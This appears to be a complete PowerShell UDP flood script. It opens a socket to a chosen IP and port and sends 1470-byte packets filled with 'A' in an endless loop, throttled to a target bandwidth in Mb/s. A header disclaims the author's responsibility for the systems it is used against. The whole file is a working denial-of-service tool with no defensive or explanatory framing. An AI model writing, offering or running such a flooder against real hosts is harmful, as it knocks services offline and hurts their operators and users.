#THE AUTHOR OF THIS SCRIPT IS NOT RESPONSIBLE FOR HOW THE SCRIPT IS USED NOR SYSTEMS USED AGAINST

param([string]$ip, [int32]$port, [int32]$speed=100)
[void][System.Reflection.Assembly]::LoadWithPartialName("System.Net.Sockets.Socket")
[void][System.Reflection.Assembly]::LoadWithPartialName("System.Text.Encoding")
[void][System.Reflection.Assembly]::LoadWithPartialName("System.Math")

#applys default values if no parameters where given
if($ip -eq ""){$ip="127.0.0.1"}
if($port -eq 0){$port=1337}

#makes udp socket
$sock=New-Object System.Net.Sockets.Socket 2,2,17
$sock.Connect($ip,$port)

#data set to 1470 A's
$message="A"*1470
$data=[System.Text.Encoding]::ASCII.GetBytes($message)


#gets how many chunks of 100mb/s are wanting to be achieved and the remainder
    #calculated rate to equal 100mbps
    $count=[system.math]::ceiling((100*1000)/758)
    #gets leftover mb/s ex 250 would equal 50mb/s leftover
    $left_over=$speed%100
    #calculate leftover mbps rate
    $count2=[system.math]::ceiling(($left_over*1000)/768)
    #how many chunks of 100mbps to run
    $jobs=[system.math]::floor($speed/100)

#send chunks of 100mbps and the leftovers then pause a milisecond and do it again
function send-it{
    echo ("sending: " + $speed + "mb/s +-4% to " + $ip + ":" + $port.ToString())
    #infinite loop yeet
    while(1 -eq 1){
        #counter for 100mb/s chunks
        for($x=0;$x-lt$jobs;$x++){
            #tracks the rate for 100mb/s
            for($i=0;$i-lt$count;$i++){
                [void]$sock.Send($data)
            }
        }
        #counter and rate for remaining mb/s
        for($y=0;$y-lt$count2;$y++){[void]$sock.send($data)}
        #sleep 1 milisecond to make controling the speed even possible
        Start-Sleep -Milliseconds 1
    }
}

send-it